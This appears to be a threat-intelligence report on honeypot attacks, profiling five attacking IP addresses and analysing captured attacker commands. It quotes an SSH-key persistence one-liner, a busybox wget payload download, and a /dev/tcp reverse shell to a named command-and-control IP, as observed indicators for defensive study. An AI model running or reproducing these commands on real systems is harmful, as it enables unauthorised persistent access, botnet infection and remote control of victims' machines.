# OSINT Investigation Report: Top Attack Vectors

This report provides detailed open-source intelligence on the most active IP addresses and command patterns identified in the Honeypot Attack Summary Report.

---

### **Part 1: IP Address Intelligence**

A deep dive into the most persistent attacking IP addresses reveals a mix of compromised servers, malicious hosting providers, and systems with extensive histories of abuse.

#### **1. IP Address: 176.65.141.117**
*   **ISP/Hosting Provider:** Optibounce, LLC (US) / Go Host Ltd (UK)
*   **Geographical Location:** Germany
*   **Summary of Malicious Activity:** This IP is flagged in multiple threat intelligence feeds. The surrounding network range is heavily associated with the **Mirai botnet family**, known for credential stuffing and large-scale DDoS attacks.
*   **Assessment:** High confidence of malicious intent, likely part of a botnet infrastructure.

#### **2. IP Address: 86.54.42.238**
*   **ISP/Hosting Provider:** Global-Data System IT Corporation
*   **Geographical Location:** Seychelles
*   **Summary of Malicious Activity:** This IP has a significant history of abuse, with numerous reports for spam and port scanning. It is listed on the **Spamhaus Project blacklist**, indicating a high probability of involvement in distributing malicious emails and malware.
*   **Assessment:** High confidence of malicious intent, likely used for spam campaigns and malware distribution.

#### **3. IP Address: 15.235.131.242**
*   **ISP/Hosting Provider:** OVH SAS
*   **Geographical Location:** France or Singapore
*   **Summary of Malicious Activity:** No public abuse reports were found for this specific IP. It is associated with the hostname `olivia.cocks.lab.go4labs.net`. While OVH is a legitimate hosting provider, its infrastructure is sometimes used by malicious actors. The lack of direct reports makes this IP an outlier among the top attackers.
*   **Assessment:** Low confidence of direct malicious intent, but its high volume of attacks is anomalous and warrants monitoring.

#### **4. IP Address: 45.234.176.18**
*   **ISP/Hosting Provider:** Mafredine Telecomunicações EIR
*   **Geographical Location:** Brazil
*   **Summary of Malicious Activity:** This IP has been reported for **SSH brute-force attacks**. This activity is consistent with large-scale campaigns originating from Brazil, often leveraging compromised routers and IoT devices. These campaigns are typically precursors to deploying cryptominers or expanding botnets.
*   **Assessment:** High confidence of malicious intent, involved in brute-force campaigns.

#### **5. IP Address: 20.2.136.52**
*   **ISP/Hosting Provider:** Microsoft Corporation
*   **Geographical Location:** United States
*   **Summary of Malicious Activity:** This IP has an exceptionally high number of abuse reports (**626 reports with 100% confidence**). It is almost certainly a compromised Microsoft Azure cloud server being used for a wide range of malicious activities.
*   **Assessment:** Very high confidence of malicious intent, a compromised cloud asset used for attacks.

---

### **Part 2: Command & Payload Analysis**

The commands executed by attackers reveal a clear, automated methodology focused on persistence, reconnaissance, and malware deployment.

#### **1. Command Pattern: SSH Key Persistence**
*   **Command:** `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3... mdrfckr" >> .ssh/authorized_keys`
*   **Objective:** To establish persistent, passwordless access to the compromised system.
*   **Analysis:** This is the most critical post-exploitation technique observed. The command deletes any existing SSH configuration and installs a new authorized key. The specific SSH key used, with the comment "mdrfckr," is a well-known Indicator of Compromise (IOC) associated with the **"Outlaw" hacking group** and the **"Dota3" malware family**. This allows the attacker to maintain control of the machine for use in cryptomining (XMRig) and other botnet activities.

#### **2. Command Pattern: Embedded System Payload Delivery**
*   **Command:** `cd /data/local/tmp/; rm *; busybox wget http://<IP>/<filename>`
*   **Objective:** To download and execute malware on Android and other embedded Linux systems.
*   **Analysis:** This pattern targets the world-writable `/data/local/tmp/` directory found on many IoT and Android devices. It uses `busybox wget`, a common utility on these systems, to download the initial payload.
    *   **Payloads (`arm.urbotnetisass`, `w.sh`):** The payloads are typically shell scripts (`w.sh`) that act as droppers for ELF binaries. The binaries (`urbotnetisass`) are compiled for specific architectures (e.g., ARM) and are variants of known IoT botnets like **Mirai** and **Gafgyt**. Once executed, the device becomes part of a botnet used for DDoS attacks and other malicious purposes.

#### **3. Command Pattern: Reverse Shell**
*   **Command:** `nohup bash -c "exec 6<>/dev/tcp/8.219.12.33/60118 && ..."`
*   **Objective:** To establish a reverse shell, giving the attacker direct command-line access to the compromised system.
*   **Analysis:** This sophisticated one-liner attempts to create a direct TCP connection to a command-and-control (C2) server at `8.219.12.33`. It then downloads a payload (`/tmp/Gnins9nsMi`) and executes it. This technique is stealthier than binding a shell to a port and is a clear indicator of an active, hands-on-keyboard attacker or a more advanced botnet.

---

### **Overall Conclusion**

The OSINT investigation confirms that the honeypot network is under constant, automated attack from a global network of malicious actors. The primary threats are from botnets targeting weak credentials and known vulnerabilities in SSH, mail servers, and IoT devices. The attackers' goals are clear: gain persistent access, deploy malware (primarily for cryptomining and DDoS), and expand their botnet infrastructure. The use of a known malicious SSH key and specific malware families like Mirai and Mozi demonstrates a connection to established and ongoing cybercrime campaigns.